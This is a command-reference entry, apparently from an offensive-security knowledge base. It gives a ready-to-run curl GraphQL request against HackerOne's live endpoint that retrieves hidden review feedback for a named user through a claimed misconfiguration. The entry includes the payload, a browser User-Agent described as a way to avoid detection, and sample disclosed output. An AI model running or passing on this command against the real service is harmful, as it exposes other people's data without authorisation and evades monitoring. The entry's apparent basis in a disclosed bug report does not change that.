---
data: >-
  curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -d
  '{"operationName":"UserProfilePage","variables":{"resourceIdentifier":"brdoors3"},"query":"query
  UserProfilePage($resourceIdentifier: String!) { user(username:
  $resourceIdentifier) { id username ...ReviewUser } } fragment ReviewUser on
  User { public_reviews(first: 5) { edges { node { id public_feedback team { id
  name handle } } } } }"}'
tags:
  - graphql
  - information-disclosure
type: command
output: >-
  JSON response with user data including 'public_reviews' containing hidden
  feedback
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:13.174Z'
id: 6f7083c8-f999-4e6e-beb3-978d741cfd51
verified: false
validated: true
submitted: true
---
# graphql-user-profile-query

## Command

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -d '{"operationName":"UserProfilePage","variables":{"resourceIdentifier":"brdoors3"},"query":"query UserProfilePage($resourceIdentifier: String!) { user(username: $resourceIdentifier) { id username ...ReviewUser } } fragment ReviewUser on User { public_reviews(first: 5) { edges { node { id public_feedback team { id name handle } } } } }"}'
```

## Description

This command sends a GraphQL POST request to HackerOne's endpoint to fetch a user's profile data, including public reviews/feedback, which may disclose hidden content due to backend misconfiguration. Use it to test for information disclosure in unauthenticated contexts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-H "User-Agent: ..."` | Mimics browser user agent to avoid detection | No |
| `-d '{...}'` | JSON payload with operationName, variables, and query | Yes |
| `resourceIdentifier` | Username to query (e.g., 'brdoors3') | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"operationName":"UserProfilePage","variables":{"resourceIdentifier":"brdoors3"},"query":"..."}'
```

### Advanced Usage

Add cookies or auth tokens if needed, but for unauthenticated disclosure, omit them:

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -H "Referer: https://hackerone.com/brdoors3?type=user" -d '{...}'
```

## Expected Output

A JSON object with 'data' key containing user profile, including 'public_reviews.edges' array. Successful disclosure shows 'node.public_feedback' with hidden text like 'Clear language & video proof - excellent report.' and 'team.name' as 'Legal Robot'.

## Related

- [[procedures/Disable-Feedback-Visibility-and-Query-GraphQL-for-Disclosure]]
